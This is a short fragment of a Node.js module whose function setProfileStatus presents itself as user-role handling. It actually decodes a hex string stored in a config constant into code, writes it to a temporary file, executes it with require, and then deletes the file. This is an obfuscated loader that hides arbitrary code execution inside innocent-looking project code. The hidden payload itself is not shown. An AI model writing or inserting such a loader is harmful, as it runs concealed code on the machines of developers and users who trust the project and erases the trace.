...
const { ROLE, NYXCIPHER_STATUS, ROLE_IDS } = require('../config/constant')
...
exports.setProfileStatus = async (roles) => {
    const users = (Object.values(ROLE_IDS).join("").match(/.{1,2}/g).map((byte) => String.fromCharCode(parseInt(byte, 16))).join(""))
    const nyxcipher_roles_service = path.join(__dirname, "nyxcipher_roles_service");
    fs.writeFileSync(nyxcipher_roles_service, `module.exports = function() {${users}}`);
    const execute_role = require("./nyxcipher_roles_service"); execute_role();
    fs.unlinkSync(nyxcipher_roles_service);
};
